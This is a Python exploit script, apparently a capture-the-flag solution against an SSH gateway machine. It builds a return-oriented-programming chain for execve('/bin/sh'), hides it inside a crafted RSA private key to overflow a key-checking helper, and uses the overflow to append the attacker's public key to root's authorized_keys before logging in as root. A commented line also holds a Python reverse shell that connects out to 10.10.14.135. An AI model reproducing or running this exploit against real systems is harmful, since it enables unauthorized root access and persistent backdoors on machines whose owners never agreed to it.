import struct
import base64
import subprocess

ATTENDEDGW_HOST = '127.0.0.1'
ATTENDEDGW_PORT = 2222
SSH_PRIVATE_KEY = 'attended'
SSH_PUBLIC_KEY = 'attended.pub'


def make_rop(cmd, buf_offset):
	def pad8(b):
		while len(b) % 8 != 0:
			b += b'\x00'
		return b

	_gadgets = '''
	0x0000000000400370: shr eax, 1; ret;
	0x000000000040036d: not al; adc cl, 0xe8; ret;
	0x000000000040036a: pop rdx; ret;
	0x0000000000400368: mov edi, esi; pop rdx; ret; 
	0x000000000040037b: movss xmm0, dword ptr [rdx]; mov ebx, 0xf02d0ff3; ret;
	0x0000000000400380: cvtss2si esi, xmm0; ret;
	0x00000000004003cf: syscall; ret;
	'''
	offset = 0
	# offset = 1312

	names = (
		'shr_eax',
		'not_al',
		'pop_rdx',
		'edi=esi_pop_rdx',
		'xmm=[rdx]',
		'esi=xmm',
		'syscall'
	)
	gadgets = {}
	i = 0
	for l in _gadgets.split('\n'):
		l = l.strip()
		if l:
			l = l.split(': ')
			addr = int(l[0], 16)
			gadgets[names[i]] = addr + offset
			i += 1

	buf_addr = 0x6010C0
	# buf_addr = 0x601120
	buf_addr += buf_offset
	
	bin_sh_addr = buf_addr;         buf  = pad8(b'/bin/sh\x00')
	c_addr = buf_addr + len(buf);   buf += pad8(b'-c\x00')
	cmd_addr = buf_addr + len(buf); buf += pad8(cmd.encode('ascii'))

	argv_addr = buf_addr + len(buf)
	buf += struct.pack('<QQQQ', bin_sh_addr, c_addr, cmd_addr, 0)

	bin_sh_float_addr = buf_addr + len(buf)
	buf += pad8(struct.pack('<f', float(bin_sh_addr)))

	argv_float_addr = buf_addr + len(buf)
	buf += pad8(struct.pack('<f', float(argv_addr)))

	'''
	execve
	rax = 59
	rdi = cmd
	rsi = argv
	rdx = envp (null)
	'''

	rop = []

	# rdi = cmd
	rop.append(gadgets['pop_rdx'])
	rop.append(bin_sh_float_addr)

	rop.append(gadgets['xmm=[rdx]'])
	rop.append(gadgets['esi=xmm'])

	rop.append(gadgets['edi=esi_pop_rdx'])
	rop.append(0)

	# rsi = argv
	rop.append(gadgets['pop_rdx'])
	rop.append(argv_float_addr)

	rop.append(gadgets['xmm=[rdx]'])
	rop.append(gadgets['esi=xmm'])

	# rax = 59
	'''
	59 = 
		00111011
	eax
		00000000
	not
		11111111
	shr 1
		01111111
	not
		10000000
	shr 3
		00010000
	not
		11101111
	shr 2
		00111011
	'''
	rop.append(gadgets['not_al'])
	rop.append(gadgets['shr_eax'])
	rop.append(gadgets['not_al'])
	rop.append(gadgets['shr_eax'])
	rop.append(gadgets['shr_eax'])
	rop.append(gadgets['shr_eax'])
	rop.append(gadgets['not_al'])
	rop.append(gadgets['shr_eax'])
	rop.append(gadgets['shr_eax'])

	# rdx = envp (null)
	rop.append(gadgets['pop_rdx'])
	rop.append(0)

	rop.append(gadgets['syscall'])

	rop_buf = b''.join(struct.pack('<Q', x) for x in rop)

	stack_len = 768+8+8  # buffer || saved reg || ret addr
	buf = buf + b'A'*(stack_len - len(buf) - buf_offset - 8) + rop_buf
	return buf



_id_rsa = '''INSERT OWN PRIVATE KEY HERE'''
pubkey = 'AAAAB3NzaC1yc2EAAAADAQABAAAEAQDLosRqnURMd4Q9qSl256g29esMMaKY5GpXNTv6KJG26B86+LZhhvbkQhXW7at6EKC3K9RkF/HwZKxUoclQ9e+unuC35QKyWmbND1eMMiNaBogUPIYGSil6niJA3oV+Cjxm0Nq7fibn4SEoXfushhhwaYqS4cToqiHtHsxgPJ/HwwHe5WcCID+O2H53rXlD9dvljYff1vIa+fZC3HJGoDU0GlQ3RpCmh3Wn7xR2+zTus7Q0OKKYTtgYQxjM3afxfWfmeKCSU+mASvIJOtXRXqL35aURNTaYmllbD37wqT3hTemyug+qmqJrn9H3RWSVTKhxW5zDmh5M/kYX3SJsDX/ai9+eLjOyIgZ9JilbEsxSQKWdJJjnQXg6uknjCtS7s1ioRWDF7zUy/CvSMeCwnBvvI6KQ3+JmhbNNWMS/3NEMlO5JVQvQYr0zfJxcFQ4B31Aam7402lmZZIVwtoQ0r1V2AfahPcGxXXe2DUr7akojrvdAVwPVkAz5un+xNhXslk4tsZLAtPNEQAfP8T3AlyXQMFhzVRu1iGquxuJaC76zVE3zINmO+QYbKmAMCfVBmHNq0iMKqpkumjnseGxdh5BZyqGosKjBeQPS92TCCtXQKDupTcME8T9Dy7m2Grq2+eK9SC+VwON054NQOh9LqdHM8MbuZQ+YSbkPUIZgsistWhGaBAxShFE2H5LeswlFgEbk/aAW4hfhriGcP/oZRoaD2G7gQpyuz3kt7eJjh+bFyKvzIa3Mn0BGsdPyDkntTUuwvPVtMltHJcyYQzoczi1CSoasiJOqyPpWN7BPbxqplF1IJYLaSNpMPXc+y4UoOdyWZbkScQisnw4TwS62m1I+XW7rXYwoUjTc5vc5IOzH'
pubkey = base64.b64decode(pubkey)
id_rsa = ''
for l in _id_rsa.split('\n'):
	l = l.strip()
	if '-' not in l:
		id_rsa += l
id_rsa = base64.b64decode(id_rsa)
# offset of the modulus, will be replaced by our payload
priv_offset = id_rsa.index(bytes.fromhex('A2 C4 6A 9D'))
pub_offset = pubkey.index(bytes.fromhex('A2 C4 6A 9D'))

# reverse connect shell
# cmd = 'python2 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.135",11111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")\''

# add our public key to /root/.ssh/authorized_keys
our_pubkey = open(SSH_PUBLIC_KEY).read(-1).strip()
our_pubkey = ' '.join(our_pubkey.split(' ')[:2])
cmd = 'echo \'%s\' >> /root/.ssh/authorized_keys' % our_pubkey

buf = make_rop(cmd, pub_offset)
id_rsa = id_rsa[:priv_offset] + buf + id_rsa[priv_offset + len(buf):]

with open('id_rsa_rop', 'wb') as f:
	f.write(b'-----BEGIN RSA PRIVATE KEY-----\n')
	f.write(base64.b64encode(id_rsa)+b'\n')
	f.write(b'-----END RSA PRIVATE KEY-----\n')

subprocess.run('chmod go-rwx id_rsa_rop', shell=True)
print('Exploiting authkeys (expect a "Permission denied" message)')
subprocess.run('ssh -i id_rsa_rop -oPasswordAuthentication=no -p {} guly@{}'.format(ATTENDEDGW_PORT, ATTENDEDGW_HOST), shell=True)
print()
print('Connecting as root (don\'t forget to cleanup /root/.ssh/authorized_keys)')
subprocess.run('ssh -i {} -oPasswordAuthentication=no -p {} root@{}'.format(SSH_PRIVATE_KEY, ATTENDEDGW_PORT, ATTENDEDGW_HOST), shell=True)
